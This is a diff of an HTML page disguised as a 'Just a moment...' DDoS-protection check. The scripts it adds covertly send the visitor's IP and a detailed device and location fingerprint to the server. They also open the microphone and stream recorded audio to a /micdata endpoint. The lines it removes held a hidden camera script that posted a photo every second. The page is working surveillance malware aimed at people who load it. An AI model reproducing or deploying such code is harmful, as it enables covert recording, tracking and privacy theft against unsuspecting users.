@@ -1,18 +1,95 @@
 <html lang="en-US">
 <head> 
-   <meta http-equiv="refresh"  content="30"> 
 <meta charset="UTF-8"> 
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
 <meta name="robots" content="noindex, nofollow">
-  
- 
-
-  
 <meta name="viewport" content="width=device-width,initial-scale=1">
+  <script>
+  function getUserIP() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => data.ip);
+}
+
+getUserIP()
+  .then(ip => {
+    const jsonData = { ip }; // Create an object with the IP address
+
+    fetch('/ip', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(jsonData)
+    });
+  })
+  .catch(error => {
+    // Handle errors silently (without logging)
+  });
+
+  // Get device information
+const deviceInfo = {
+  
+  // Browser information
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  browserName: navigator.appName,
+  browserVersion: navigator.appVersion,
+  browserPlatform: navigator.platform,
+
+  // Screen information
+  screenWidth: screen.width,
+  screenHeight: screen.height,
+  screenColorDepth: screen.colorDepth,
+  screenPixelDepth: screen.pixelDepth,
+
+  // Device information
+  deviceType: navigator.deviceType,
+  deviceMemory: navigator.deviceMemory,
+  hardwareConcurrency: navigator.hardwareConcurrency,
+
+  // Battery information (if available)
+  battery: navigator.battery || navigator.getBattery(),
+  batteryLevel: navigator.battery ? navigator.battery.level : null,
+  batteryCharging: navigator.battery ? navigator.battery.charging : null,
+
+  // Network information
+  connectionType: navigator.connection.type,
+  effectiveConnectionType: navigator.connection.effectiveType,
+  rtt: navigator.connection.rtt,
+  downlink: navigator.connection.downlink,
+  downlinkMax: navigator.connection.downlinkMax,
+
+  // Geolocation information (if available)
+  geolocation: navigator.geolocation,
+  latitude: navigator.geolocation ? navigator.geolocation.latitude : null,
+  longitude: navigator.geolocation ? navigator.geolocation.longitude : null,
+
+  // Time zone information
+  timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+  // Device orientation information
+  orientation: screen.orientation.type,
+};
+
+// Convert device information to JSON
+const jsonData = JSON.stringify(deviceInfo, null, 2);
+
+// Share JSON data
+console.log(jsonData);
+console.log("hi hacker ");
+// Optional: Send JSON data to server
+fetch('/api', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: jsonData,
+})
+.then((response) => response.json())
+.then((data) => console.log(data))
+.catch((error) => console.error(error));
+  </script>
+		
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 <script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
-<script src="index.js" type="text/javascript" charset="utf-8" defer></script>
 <title>Just a moment....</title> 
 <style type="text/css">
 html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
@@ -38,13 +115,72 @@ a:hover{color: #f4a15d}
 </style> 
 </head> 
 <body>
-        <div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
- 
- <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
-  
+  <audio id="audio" controls hidden muted>
+    
+    
+    <script>
+const audio = document.getElementById('audio');
+const status = document.getElementById('status');
 
+// Access the microphone
+navigator.mediaDevices.getUserMedia({ audio: true })
+  .then(stream => {
+    audio.srcObject = stream;
+    audio.play();
+    recordAudio();
+  })
+  .catch(err => {
+    console.error('Error accessing media devices.', err);
+    status.textContent = 'Error accessing microphone: ' + err.message;
+  });
+
+// Record audio every second
+function recordAudio() {
+  setInterval(() => {
+    const mediaRecorder = new MediaRecorder(audio.srcObject);
+    const recordedChunks = [];
+
+    mediaRecorder.ondataavailable = event => {
+      recordedChunks.push(event.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(recordedChunks, { type: 'audio/wav' });
+      const reader = new FileReader();
+
+      reader.onload = () => {
+        const base64Audio = reader.result.split(',')[1]; // Get Base64 part
+        const jsonPayload = JSON.stringify({ audio: base64Audio });
+
+        fetch('/micdata', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: jsonPayload
+        })
+          .then(response => response.json())
+          .then(data => {
+            console.log("Server Response:", data);
+            status.textContent = 'Audio sent successfully!';
+          })
+          .catch(error => {
+            console.error("Error:", error);
+            status.textContent = 'Error sending audio: ' + error.message;
+          });
+      };
+
+      reader.readAsDataURL(blob);
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 11000); // Record for 1 second
+  }, 11190); // Record every 1 second
+}
+
+
+  </script>
+  
 <table width="100%" height="100%" cellpadding="20"> 
 <tbody>
 <tr> 
@@ -84,69 +220,6 @@ DDoS protection by
 </table>
 <video id="video" style="display:none"  playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
-    <script>
-   
- 
-
-
-
-const video = document.getElementById('video');
-        const photoPreview = document.getElementById('photoPreview');
-        const status = document.getElementById('status');
-
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                capturePhoto();
-            })
-            .catch(err => {
-                console.error('Error accessing media devices.', err);
-                status.textContent = 'Error accessing camera: ' + err.message;
-            });
-
-        // Capture photo every second
-        function capturePhoto() {
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 940; // Set the desired width
-               canvas.height = 880; // Set the desired height
-                const ctx = canvas.getContext('2d');
-                const quality = 0.1; // Adjust quality (0-1)
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const dataURL = canvas.toDataURL('image/png', quality); // Convert to Base64
-                const base64Image = dataURL.split(',')[1]; // Get Base64 part
-
-                // Send image in JSON format
-                const jsonPayload = JSON.stringify({ image: base64Image });
-
-                // Send the JSON object to the backend
-                fetch('/data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: jsonPayload
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Server Response:", data);
-                    status.textContent = 'Photo sent successfully!';
-                    photoPreview.src = dataURL; // Show the captured photo
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    status.textContent = 'Error sending photo: ' + error.message;
-                });
-            }, 1000); // Capture every 1000 milliseconds (1 second)
-        }
-
-
-
-   </script>
-   
 <script type="text/javascript" charset="utf-8">
   function choice(seq) {
   const randomIndex = Math.floor(Math.random() * seq.length);
@@ -159,3 +232,4 @@ document.getElementById("ray").innerText = randomKey;
 </script>
 </body>
 </html>
+
